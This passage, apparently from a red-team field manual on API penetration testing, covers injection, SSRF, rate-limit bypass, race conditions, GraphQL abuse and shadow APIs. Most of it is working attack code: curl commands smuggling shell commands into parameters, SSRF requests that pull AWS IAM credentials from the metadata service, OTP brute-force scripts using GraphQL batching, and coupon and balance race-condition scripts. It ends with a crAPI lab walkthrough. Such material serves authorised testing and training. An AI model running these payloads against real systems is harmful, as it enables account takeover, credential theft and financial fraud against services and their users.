  -H "Authorization: Bearer TOKEN"

# JSON body injection:
curl -X POST "https://target.com/api/v1/users/search" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username": "alice\" OR \"1\"=\"1", "password": "anything"}'

# Order/sort parameter injection:
curl "https://target.com/api/v1/users?sort=id;SELECT 1--" \
  -H "Authorization: Bearer TOKEN"

# ── NOSQL INJECTION IN JSON APIs ────────────────────────────────
# MongoDB uses JSON operators for queries
# Inject operators instead of values:

# Login bypass via $ne (not equal):
curl -X POST "https://target.com/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
# Expected if vulnerable: logs in as first user in database!

# Extract data with $gt (greater than):
curl -X POST "https://target.com/api/v1/users/search" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"username": {"$gt": ""}, "role": {"$eq": "admin"}}'
# Returns all admin users!

# Regex-based extraction (blind NoSQL injection):
curl -X POST "https://target.com/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": "^a"}}'
# If 200: password starts with 'a'
# Binary search for each character → extract full password!

# ── COMMAND INJECTION IN API PARAMETERS ──────────────────────────
# APIs that process commands (ping, nslookup, file convert):
curl -X POST "https://target.com/api/v1/tools/ping" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"host": "8.8.8.8; id"}'

curl -X POST "https://target.com/api/v1/tools/nslookup" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"hostname": "target.com`whoami`"}'

# Also test: file processing APIs (convert image, compress file)
# Filename injection:
curl -X POST "https://target.com/api/v1/files/process" \
  -H "Authorization: Bearer TOKEN" \
  -F "file=@test.jpg;filename=test.jpg;$(id)"
```

---

## 15. Server-Side Request Forgery via API

```bash
# APIs that fetch external URLs are SSRF targets
# Found in: webhook URLs, profile picture URLs, PDF generators, link preview

# ── IDENTIFY SSRF POINTS ─────────────────────────────────────────
# Look for API parameters that accept URLs:
# callback_url, webhook, image_url, url, link, download, fetch, redirect_to

# ── BASIC SSRF TEST ───────────────────────────────────────────────
# Use Burp Collaborator or interactsh to detect SSRF:
# Your domain: abc123.oastify.com (Burp Collaborator)

curl -X POST "https://target.com/api/v1/webhooks" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://abc123.oastify.com/ssrf-test"}'
# Check Collaborator for incoming request
# If request arrives: SSRF confirmed!

# ── AWS METADATA SERVICE (IMDS) VIA SSRF ──────────────────────────
# If target is on AWS:
curl -X POST "https://target.com/api/v1/fetch" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# Expected if vulnerable: IAM role name returned
# Then fetch credentials:
curl -X POST "https://target.com/api/v1/fetch" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"}'
# Returns: AccessKeyId, SecretAccessKey, Token → full AWS access!

# ── SSRF URL BYPASS TECHNIQUES ───────────────────────────────────
# If filter blocks "169.254.169.254":
# Decimal: http://2852039166/ (169.254.169.254 in decimal)
# Hex: http://0xA9FEA9FE/
# Octal: http://0251.0376.0251.0376/
# IPv6: http://[::ffff:169.254.169.254]/
# Domain: http://169.254.169.254.nip.io/  (resolves to 169.254.169.254)
# Redirect: http://attacker.com/redirect → 301 → 169.254.169.254

for ip in "169.254.169.254" "2852039166" "0xA9FEA9FE" "[::ffff:169.254.169.254]"; do
  curl -s -X POST "https://target.com/api/v1/fetch" \
    -d "{\"url\": \"http://$ip/latest/meta-data/\"}"
done
```

---

# PART 5 — RATE LIMITING & BUSINESS LOGIC

---

## 17. Rate Limiting — Bypass Techniques

```bash
# Rate limiting protects: password spray, credential brute force, OTP brute force
# Goal: make unlimited requests look like different clients

# ── IP ROTATION BYPASS ────────────────────────────────────────────
# Add X-Forwarded-For or similar headers to spoof IP:
curl "https://target.com/api/v1/login" \
  -H "X-Forwarded-For: 1.2.3.4" \
  -d '{"username":"admin","password":"test"}'

# Rotate IP per request:
for i in $(seq 1 100); do
  IP="$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1))"
  curl -s "https://target.com/api/v1/login" \
    -H "X-Forwarded-For: $IP" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"Password123!"}'
done

# Headers to try for IP spoofing:
# X-Forwarded-For
# X-Real-IP
# X-Originating-IP
# X-Remote-IP
# X-Client-IP
# Forwarded: for=1.2.3.4

# ── ACCOUNT IDENTIFIER ROTATION ──────────────────────────────────
# Rate limit per account, not globally?
# Try variations of the target username:
# alice@target.com
# ALICE@target.com        ← case variation
# alice+test@target.com   ← plus addressing (still delivers to alice)
# alice@TARGET.COM        ← domain case variation

# ── OTP BRUTE FORCE ───────────────────────────────────────────────
# 6-digit OTP = 1,000,000 combinations
# Rate limit at 5/minute = 3.3 days... if enforced

# Check for race condition in OTP validation:
# Send 10 OTP attempts simultaneously:
for otp in 123456 234567 345678 456789 567890 678901 789012 890123 901234 012345; do
  curl -s -X POST "https://target.com/api/v1/verify-otp" \
    -H "Authorization: Bearer TOKEN" \
    -d "{\"otp\": \"$otp\"}" &
done
wait
# Race condition: multiple attempts processed before rate limit kicks in

# ── REQUEST MANIPULATION ──────────────────────────────────────────
# Some rate limiters check specific fields
# Try: different User-Agents, Accept headers, Content-Type, TLS fingerprints

# ── NULL BYTE / ENCODING BYPASS ───────────────────────────────────
# Append null bytes or special chars to bypass rate limit matching:
curl "https://target.com/api/v1/login" \
  -d '{"username":"admin\u0000","password":"test"}'
# null byte in username might bypass rate limit while still authenticating as 'admin'

# ── PARAMETER POLLUTION ───────────────────────────────────────────
curl "https://target.com/api/v1/login?username=admin&username=admin" \
  -d '{"password":"test"}'
# Duplicate parameters may confuse rate limiter key
```

---

## 19. Race Conditions in APIs

```bash
# Race conditions occur when timing windows exist between check and action

# ── CLASSIC RACE CONDITION: USE A COUPON TWICE ────────────────────
# Website allows one coupon per account
# Race: send 20 coupon-apply requests simultaneously

python3 << 'EOF'
import requests
import threading
import time

TOKEN = "your_jwt_token"
COUPON = "SAVE50"
URL = "https://target.com/api/v1/orders/apply-coupon"

results = []

def apply_coupon():
    r = requests.post(URL,
        headers={"Authorization": f"Bearer {TOKEN}",
                 "Content-Type": "application/json"},
        json={"coupon_code": COUPON, "order_id": "ORDER_123"})
    results.append(r.status_code)

# Fire 20 simultaneous requests:
threads = [threading.Thread(target=apply_coupon) for _ in range(20)]
start = time.time()
for t in threads: t.start()
for t in threads: t.join()
end = time.time()

print(f"Time: {end-start:.2f}s")
print(f"Results: {results}")
successes = results.count(200)
print(f"Successful applications: {successes}")
if successes > 1:
    print("RACE CONDITION! Coupon applied multiple times!")
EOF

# ── LIMIT OVERRIDE: BUY MORE THAN ALLOWED ────────────────────────
# API limits purchase to 1 item per user
# Race: send 10 buy requests at same moment
python3 << 'EOF'
import requests, threading

def buy_item():
    r = requests.post("https://target.com/api/v1/buy",
        headers={"Authorization": "Bearer TOKEN"},
        json={"item_id": "RARE_ITEM", "quantity": 1})
    print(f"Status: {r.status_code} - {r.json().get('message','')}")

threads = [threading.Thread(target=buy_item) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
EOF

# ── BALANCE RACE CONDITION ────────────────────────────────────────
# Spend $100 balance on two simultaneous orders
# Before either order completes the balance check, both see $100 balance
python3 << 'EOF'
import requests, threading

def place_order(amount):
    r = requests.post("https://target.com/api/v1/orders",
        headers={"Authorization": "Bearer TOKEN"},
        json={"total": amount})
    print(f"Order {amount}: {r.status_code}")

# Try to spend balance twice simultaneously:
t1 = threading.Thread(target=place_order, args=(95,))
t2 = threading.Thread(target=place_order, args=(95,))
t1.start(); t2.start()
t1.join(); t2.join()
# If both succeed: $95 spent from $100 balance twice = -$90 balance!
EOF
```

---

# PART 6 — GRAPHQL SECURITY

---

## 20. GraphQL — Architecture & Attack Surface

```
GraphQL ARCHITECTURE:
  Single endpoint: POST /graphql
  Client specifies EXACTLY what data it wants in a query language
  
  Query (read):
    query { user(id: "123") { name email role } }
    
  Mutation (write):
    mutation { updateUser(id: "123", role: "admin") { success } }
  
  Subscription (real-time):
    subscription { newMessages { content author } }
  
ATTACK SURFACE:
  1. Introspection     → Reveals ENTIRE schema (all types, fields, mutations)
  2. Query depth       → Nested queries can cause exponential computation
  3. Query complexity  → Many fields in one query = DoS
  4. Batching          → Multiple operations in one request
  5. Authorization     → Per-field auth often missing
  6. Injection         → SQL/NoSQL injection via field values
  7. IDOR              → Same as REST but harder to find
  8. CSRF              → No SameSite cookies often
```

---

## 21. GraphQL Introspection & Schema Extraction

```bash
# ── BASIC INTROSPECTION ──────────────────────────────────────────
# Introspection = ask GraphQL for its own schema
# Should be DISABLED in production — often isn't!

curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ __schema { types { name } } }"}'
# Expected if introspection enabled:
# {"data":{"__schema":{"types":[{"name":"User"},{"name":"Order"},{"name":"Admin"},...]}}}

# Full schema extraction:
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name } } args { name type { name kind } } } } } }"
  }' | python3 -m json.tool > graphql_schema.json

# ── GRAPHQL VOYAGER — VISUALIZE SCHEMA ────────────────────────────
# GraphQL Voyager: visual schema explorer
# npm install -g graphql-voyager
# Or: paste schema into https://ivangoncharov.github.io/graphql-voyager/

# ── WHEN INTROSPECTION IS DISABLED: CLAIRVOYANCE ─────────────────
# Clairvoyance bruteforces field names when introspection is off:
pip3 install clairvoyance
python3 -m clairvoyance \
  -t https://target.com/graphql \
  -H "Authorization: Bearer TOKEN" \
  -w /usr/share/seclists/Discovery/Web-Content/api.txt \
  -o schema.json
# Tries field names from wordlist → infers schema from error messages

# ── EXTRACT ALL TYPES AND FIELDS ─────────────────────────────────
python3 << 'EOF'
import requests, json

GRAPHQL_URL = "https://target.com/graphql"
HEADERS = {
    "Content-Type": "application/json",
    "Authorization": "Bearer TOKEN"
}

# Full introspection query:
INTROSPECT = """
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name defaultValue type { name kind } }
      }
    }
  }
}
"""

r = requests.post(GRAPHQL_URL, 
    headers=HEADERS,
    json={"query": INTROSPECT})
schema = r.json().get("data", {})

# Print all queries:
query_type = schema.get("__schema", {}).get("queryType", {}).get("name", "Query")
types = {t["name"]: t for t in schema.get("__schema", {}).get("types", [])}

print("=== QUERIES ===")
for field in types.get(query_type, {}).get("fields", []):
    args = [f"{a['name']}: {a['type']['name']}" for a in field.get("args", [])]
    print(f"  {field['name']}({', '.join(args)})")

mutation_type = schema.get("__schema", {}).get("mutationType", {}).get("name", "Mutation")
print("\n=== MUTATIONS ===")
for field in types.get(mutation_type, {}).get("fields", []):
    args = [f"{a['name']}: {a['type']['name']}" for a in field.get("args", [])]
    print(f"  {field['name']}({', '.join(args)})")
EOF

# Expected output:
# === QUERIES ===
#   user(id: ID)
#   users(role: String)      ← Can filter by role!
#   adminUsers()             ← Admin query!
#   searchOrders(status: String)
#
# === MUTATIONS ===
#   updateUser(id: ID, role: String)   ← Can update role!
#   deleteUser(id: ID)
#   createApiKey(userId: ID)           ← Create API keys!
```

---

## 22. GraphQL Injection & Query Abuse

```bash
# ── SQL/NOSQL INJECTION VIA GRAPHQL ──────────────────────────────
# GraphQL field values can have injection if not parameterized

# Basic SQL injection:
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ user(id: \"1 OR 1=1--\") { id username email } }"}'

# NoSQL injection via GraphQL:
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ login(username: \"{$ne: null}\", password: \"{$ne: null}\") { token } }"}'

# ── IDOR VIA GRAPHQL ────────────────────────────────────────────
# Change ID in query to access other users:
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ user(id: \"VICTIM_USER_ID\") { id username email ssn creditCard } }"}'

# ── EXCESSIVE DATA VIA FIELD SELECTION ───────────────────────────
# GraphQL lets client choose fields — request sensitive fields UI doesn't show:
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ me { id username email passwordHash apiKey adminToken role permissions } }"}'
# Server may return ALL requested fields without checking which are sensitive!

# ── GRAPHQL BATCHING ATTACK ───────────────────────────────────────
# Send multiple queries in one request to bypass rate limiting:
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
    {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"},
    {"query": "mutation { login(username: \"admin\", password: \"pass3\") { token } }"}
  ]'
# One HTTP request = three password attempts
# Rate limiter counting requests (not attempts) won't catch this!

# ── OTP BRUTE FORCE VIA BATCHING ──────────────────────────────────
# Brute force OTP with 1000 guesses in a single request:
python3 << 'EOF'
import requests, json

queries = []
for otp in range(10000):
    queries.append({
        "operationName": f"verify{otp}",
        "query": f"""mutation {{ verifyOTP(code: "{otp:04d}", userId: "VICTIM_ID") {{ success token }} }}"""
    })

r = requests.post(
    "https://target.com/graphql",
    headers={"Content-Type": "application/json", "Authorization": "Bearer TOKEN"},
    json=queries[:1000]  # First 1000 OTPs
)

results = r.json()
for i, res in enumerate(results):
    if res.get("data", {}).get("verifyOTP", {}).get("success"):
        print(f"OTP FOUND: {i:04d}")
        print(f"Token: {res['data']['verifyOTP']['token']}")
        break
EOF
```

---

# PART 7 — REST API METHODOLOGY

---

## 25. Burp Suite for API Testing

```bash
# ── CONFIGURE FOR API TESTING ─────────────────────────────────────
# Burp → Proxy → Options → Add 0.0.0.0:8080
# For command-line tools (curl, httpx):
export https_proxy=http://127.0.0.1:8080
export http_proxy=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080

# Now ALL curl/httpx requests go through Burp!
curl -k "https://target.com/api/v1/users"  # -k = skip cert verify (for Burp's cert)

# ── ESSENTIAL BURP EXTENSIONS FOR API TESTING ─────────────────────
# Install via BApp Store:
# - Logger++: enhanced logging with filtering
# - Param Miner: find hidden parameters
# - JSON Web Tokens: JWT editor and attacks
# - Autorize: automated authorization testing
# - API Scanner: automated API vulnerability scanning
# - Hackvertor: encoding/decoding transformations
# - HTTP Request Smuggler: find request smuggling

# ── AUTORIZE — AUTOMATED IDOR TESTING ────────────────────────────
# Autorize: intercepts requests, replays them as another user
# Setup:
# 1. Log in as User A
# 2. Get User B's cookie/token → paste in Autorize header config
# 3. Browse app as User A
# Autorize automatically repeats every request as User B
# Flags when User B's response differs from "unauthorized" (IDOR!)

# ── INTRUDER FOR API FUZZING ────────────────────────────────────────
# Capture request with Burp → Send to Intruder
# Mark injection points: §user_id§, §token§
# Attack types:
# Sniper:     One position, one wordlist
# Battering:  Multiple positions, same wordlist
# Pitchfork:  Multiple positions, parallel wordlists (different payloads per position)
# Cluster:    Multiple positions, all combinations

# For IDOR:
# Position: the ID in /api/v1/users/§1234§
# Payload: Numbers 1-10000
# Filter: Response length varies OR status 200

# ── REPEATER FOR MANUAL TESTING ───────────────────────────────────
# Send API request to Repeater
# Modify: headers, parameters, body
# See each response immediately
# Good for: testing JWT attacks, IDOR with specific IDs, injection
```

---

## 26. API Fuzzing — ffuf, wfuzz for APIs

```bash
# ── FFUF FOR API ENDPOINT DISCOVERY ──────────────────────────────
# Discover paths:
ffuf -u "https://target.com/api/v1/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -mc 200,201,204,301,302,401,403 \
  -ac     # auto-calibrate to filter false positives
  -o ffuf_endpoints.json

# Discover HTTP methods for a known endpoint:
ffuf -u "https://target.com/api/v1/users/123" \
  -w <(echo -e "GET\nPOST\nPUT\nPATCH\nDELETE\nHEAD\nOPTIONS\nTRACE") \
  -X FUZZ \
  -H "Authorization: Bearer TOKEN" \
  -mc 200,201,204,405 \
  -t 5

# Fuzz request body parameters:
ffuf -u "https://target.com/api/v1/login" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt \
  -mc 200 \
  -t 20

# Fuzz multiple parameters simultaneously:
ffuf -u "https://target.com/api/v1/users/USERID/orders/ORDERID" \
  -w user_ids.txt:USERID \
  -w order_ids.txt:ORDERID \
  -H "Authorization: Bearer TOKEN" \
  -mc 200 \
  -mode pitchfork   # Test corresponding pairs

# ── COMPREHENSIVE API FUZZING SCRIPT ──────────────────────────────
#!/bin/bash
TARGET="https://target.com"
TOKEN="your_bearer_token"
WORDLIST="/usr/share/seclists/Discovery/Web-Content/api.txt"

echo "[*] Phase 1: Endpoint Discovery"
ffuf -u "$TARGET/api/FUZZ" \
  -w "$WORDLIST" \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,201,204,301,302,401,403 \
  -ac -o /tmp/endpoints.json -of json -s

echo "[*] Phase 2: Version Discovery"
ffuf -u "$TARGET/FUZZ/users" \
  -w <(echo -e "api/v1\napi/v2\napi/v3\nv1\nv2\nv3\napi\nrest") \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,401,403 -ac -s

echo "[*] Phase 3: Parameter Fuzzing on found endpoints"
cat /tmp/endpoints.json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for r in data.get('results', []):
    print(r['url'])
" | while read url; do
  arjun -u "$url" -H "Authorization: Bearer $TOKEN" -q 2>/dev/null
done
```

---

# PART 9 — API VERSIONING & SHADOW APIS

---

## 31. API Versioning Attacks — Finding Old Endpoints

```bash
# Old API versions often lack:
# - Rate limiting (added later)
# - CORS restrictions (tightened later)
# - Authorization checks (added after reports)
# - Input validation (improved over time)
# = Same functionality, less security!

# ── FIND ALL VERSIONS ─────────────────────────────────────────────
for v in v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 \
         "1.0" "2.0" "3.0" "1.1" "2.1" \
         beta alpha legacy old; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/$v/users" \
    -H "Authorization: Bearer TOKEN")
  [ "$code" != "404" ] && echo "[$code] /api/$v"
done
# Expected:
# [200] /api/v1  ← Old version
# [200] /api/v2  ← Current version
# [403] /api/v3  ← Beta, restricted

# ── TEST SECURITY CONTROLS ON OLD VERSION ────────────────────────
# Current version: /api/v2/users/123 → 403 (fixed IDOR)
# Old version: /api/v1/users/123 → 200 (unfixed IDOR!)

curl "https://target.com/api/v1/users/999" \
  -H "Authorization: Bearer TOKEN"
# vs
curl "https://target.com/api/v2/users/999" \
  -H "Authorization: Bearer TOKEN"
# Compare: v1 may have no auth check, v2 does

# ── TEST RATE LIMITING ON OLD VERSION ─────────────────────────────
# Rapid requests to old version (no rate limiting):
for i in $(seq 1 100); do
  curl -s "https://target.com/api/v1/login" \
    -d '{"username":"admin","password":"test'$i'"}' &
done
# Old version: all 100 requests succeed
# New version: rate limited after 5
```

---

## 32. Shadow & Undocumented APIs

```bash
# Shadow APIs = endpoints that exist but aren't in documentation
# Developers forget to secure undocumented endpoints

# ── DISCOVER UNDOCUMENTED ENDPOINTS ──────────────────────────────
# Method 1: Wayback Machine for old API documentation
curl "http://web.archive.org/cdx/search/cdx?url=target.com/api/*&output=json&fl=original" | \
  python3 -c "
import json, sys
data = json.load(sys.stdin)
paths = set(item[0].split('target.com')[1].split('?')[0] for item in data[1:])
print('\n'.join(sorted(paths)))
"
# Historical API paths that may still work!

# Method 2: JavaScript source analysis
# Find API calls in JavaScript bundles:
curl -s "https://target.com/static/app.bundle.js" | \
  grep -oP '/api/[a-zA-Z0-9/_-]+' | sort -u

# Method 3: Mobile app analysis
# Android/iOS apps often call APIs the web UI doesn't
# Decompile APK → extract all API endpoints (Mobile module)

# Method 4: Swagger/OpenAPI completeness check
# Official swagger may be incomplete
# Test variations of documented endpoints:
# Documented: /api/v1/users (GET, POST)
# Undocumented: /api/v1/users/export (GET) → returns all users!
#               /api/v1/users/bulk (DELETE) → bulk delete!
#               /api/v1/users/admin (GET) → admin users!

for suffix in /export /bulk /all /admin /debug /internal /count /search/all; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/v1/users$suffix" \
    -H "Authorization: Bearer TOKEN")
  [ "$code" != "404" ] && echo "[$code] /api/v1/users$suffix"
done
```

---

# PART 10 — FULL METHODOLOGY

---

## 33. Complete API Pentest Methodology

```
API PENTEST METHODOLOGY — PHASE BY PHASE:

PHASE 1: INFORMATION GATHERING (30 min)
  □ Find all API endpoints (JS source, Swagger, brute force)
  □ Identify authentication mechanism (JWT, API key, session)
  □ Map data objects (users, orders, products, etc.)
  □ Find API version history
  □ Download and read OpenAPI/Swagger spec if available
  
PHASE 2: AUTHENTICATION TESTING (30 min)
  □ Test without any authentication (remove header)
  □ Test with invalid token
  □ Test with expired token
  □ JWT: decode and analyze claims
  □ JWT: test alg:none, weak secret, RS256→HS256
  □ API key: check if in URL (logged), rotate, test across endpoints
  □ OAuth: test open redirect, state bypass, PKCE bypass
  
PHASE 3: AUTHORIZATION TESTING (60 min) — HIGHEST VALUE
  □ BOLA/IDOR: for every endpoint with an ID, change the ID
  □ BFLA: test admin endpoints with regular token
  □ BFLA: test destructive methods (DELETE, PUT) 
  □ Property: request sensitive fields explicitly
  □ Mass assignment: add extra fields in POST/PUT requests
  □ Test horizontal + vertical privilege escalation
  
PHASE 4: INPUT VALIDATION (30 min)
  □ SQLi: test string parameters with SQLi payloads
  □ NoSQL: test JSON parameters with MongoDB operators
  □ Command injection: test file/URL/domain parameters
  □ SSRF: find URL-accepting parameters, test internal targets
  □ XXE: test XML endpoints with XXE payloads
  □ Path traversal: test file parameters
  
PHASE 5: BUSINESS LOGIC (30 min)
  □ Rate limiting: test OTP, login, sensitive actions
  □ Race conditions: concurrent requests on critical functions
  □ Business rules: negative quantities, zero prices, boundary values
  □ Workflow bypass: skip steps in multi-step processes
  
PHASE 6: CONFIGURATION (15 min)
  □ CORS: test with malicious Origin header
  □ HTTP methods: test all methods on every endpoint  
  □ Error messages: look for stack traces, internal info
  □ Security headers: check for missing security headers
```

---

## 34. API Pentest Checklist

```
╔══════════════════════════════════════════════════════════════════╗
║                  API SECURITY CHECKLIST                         ║
╠══════════════════════════════════════════════════════════════════╣
║  AUTHENTICATION                                                  ║
║  □ Unauthenticated access to all endpoints                      ║
║  □ JWT: alg:none bypass                                         ║
║  □ JWT: weak HS256 secret (hashcat -m 16500)                    ║
║  □ JWT: RS256 → HS256 confusion                                 ║
║  □ JWT: kid header SQL injection / path traversal               ║
║  □ JWT: jku/x5u header injection                                ║
║  □ JWT: expired token acceptance                                ║
║  □ JWT: no signature validation (modify payload, send as-is)    ║
║                                                                  ║
║  AUTHORIZATION (OWASP API TOP 10)                               ║
║  □ BOLA/IDOR: test every object ID (numeric AND UUID)           ║
║  □ BOLA: IDs in URL, query string, body, headers                ║
║  □ BFLA: admin endpoints with regular user token                ║
║  □ BFLA: HTTP method variations (GET auth but DELETE not)       ║
║  □ Mass assignment: extra fields in POST/PUT/PATCH              ║
║  □ Mass assignment: role/admin fields in registration           ║
║  □ Excessive exposure: request sensitive fields explicitly       ║
║                                                                  ║
║  INJECTION                                                       ║
║  □ SQLi: all string parameters with standard payloads           ║
║  □ NoSQL: JSON params with {"$ne": null}, {"$gt": ""}           ║
║  □ SSRF: URL-accepting params → 169.254.169.254 (IMDS)         ║
║  □ Command injection: host/filename params                       ║
║                                                                  ║
║  RATE LIMITING                                                   ║
║  □ X-Forwarded-For rotation on login                            ║
║  □ GraphQL batching for OTP brute force                         ║
║  □ Race condition on: coupons, purchases, OTP                   ║
║                                                                  ║
║  GRAPHQL SPECIFIC                                               ║
║  □ Introspection enabled (reveals full schema)                  ║
║  □ Query depth limit (nested query DoS)                         ║
║  □ Batching abuse (bypass rate limiting)                        ║
║  □ IDOR in GraphQL queries                                      ║
║  □ Excessive fields in query selection                          ║
║                                                                  ║
║  SHADOW/OLD APIs                                                ║
║  □ Old API versions (/v1/, /v2/, /beta/)                       ║
║  □ Undocumented endpoints from JS source                        ║
║  □ HTTP methods not in documentation                            ║
║  □ Admin endpoints not in public documentation                  ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## 35. Full Chain: API Pentest Lab

```bash
# ══════════════════════════════════════════════════════════════════
# FULL CHAIN: crAPI Lab (Completely Ridiculous API)
# Setup: docker-compose up in crapi directory
# Target: http://localhost:3000
# ══════════════════════════════════════════════════════════════════

BASE="http://localhost:3000"

# ── PHASE 1: REGISTER AND EXPLORE ─────────────────────────────────
curl -X POST "$BASE/identity/api/auth/signup" \
  -H "Content-Type: application/json" \
  -d '{"name":"Attacker","email":"attacker@evil.com","number":"9876543210","password":"Password123!"}'

TOKEN=$(curl -s -X POST "$BASE/identity/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"Password123!"}' | \
  python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")
echo "JWT Token: $TOKEN"

# ── PHASE 2: JWT ANALYSIS ─────────────────────────────────────────
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# Expected:
# {"sub":"attacker@evil.com","role":"user","iat":...,"exp":...}

# ── PHASE 3: IDOR DISCOVERY ───────────────────────────────────────
# Get your own vehicle ID:
curl "$BASE/identity/api/v2/vehicle/vehicles" \
  -H "Authorization: Bearer $TOKEN"
# Expected: {"vehicleId":"123e4567-e89b-12d3-a456-426614174000",...}

MY_VID="123e4567-e89b-12d3-a456-426614174000"

# Try accessing other vehicles:
curl "$BASE/identity/api/v2/vehicle/OTHER_VID/location" \
  -H "Authorization: Bearer $TOKEN"
# If returns location data: IDOR found!

# ── PHASE 4: EXCESSIVE DATA IN RESPONSE ───────────────────────────
curl "$BASE/identity/api/v2/user/dashboard" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
# Look for: fields not shown in UI, other users' data, sensitive info

# ── PHASE 5: MASS ASSIGNMENT ──────────────────────────────────────
curl -X PUT "$BASE/identity/api/v2/user/videos/VIDEO_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"videoName": "test", "conversion_params": "--help"}'
# conversion_params may be passed to ffmpeg! Command injection!

# ── PHASE 6: BROKEN FUNCTION LEVEL AUTH ───────────────────────────
curl "$BASE/identity/api/v2/admin/users/find" \
  -H "Authorization: Bearer REGULAR_USER_TOKEN"
# Admin endpoint accessible with regular token?

# ── PHASE 7: BOLA IN FORUMS ────────────────────────────────────────
# Get posts from community forum:
curl "$BASE/community/api/v2/community/posts/recent" \
  -H "Authorization: Bearer $TOKEN"
# Note: post IDs and author IDs

# Read another user's private posts:
curl "$BASE/community/api/v2/community/posts/ANOTHER_USER_POST_ID" \
  -H "Authorization: Bearer $TOKEN"

# ── PHASE 8: SSRF VIA SHOP ─────────────────────────────────────────
# Shop endpoint accepts URLs for product images:
curl -X POST "$BASE/workshop/api/shop/products" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_image_url": "http://169.254.169.254/latest/meta-data/"}'
# SSRF to internal metadata service!

echo "[+] API pentest complete!"
```

---

*Next module: **Cloud Pentesting Deep Chains (AWS/Azure/GCP)** — IAM privilege escalation, SSRF to IMDS, misconfigured storage buckets, Kubernetes escape to cloud, cross-service attack chains, and full cloud red team methodology.*

*Cross-references:*
- *Web application injection and auth: `Web_Application_Security_RedTeam_Field_Manual.md`*
- *SSRF to cloud credentials: `Cloud_Networking_Sections_18_to_36.md` Section 24*
- *Mobile apps hitting these APIs: `Mobile_Pentesting_Android_iOS_RedTeam_Field_Manual.md`*
- *OSINT for finding API endpoints and docs: `OSINT_Reconnaissance_RedTeam_Field_Manual.md`*

*Tools: Burp Suite, ffuf, arjun, jwt_tool, graphql-cop, clairvoyance,*
*grpcurl, Postman, nuclei, httpx, OWASP ZAP, wfuzz, Autorize (Burp extension)*

*Labs: crAPI (OWASP — purpose-built for API vulns), DVWS, VAmPI,*
*Juice Shop (has API challenges), PortSwigger Web Security Academy (API sections),*
*HackTheBox API challenges, PentesterLab API courses*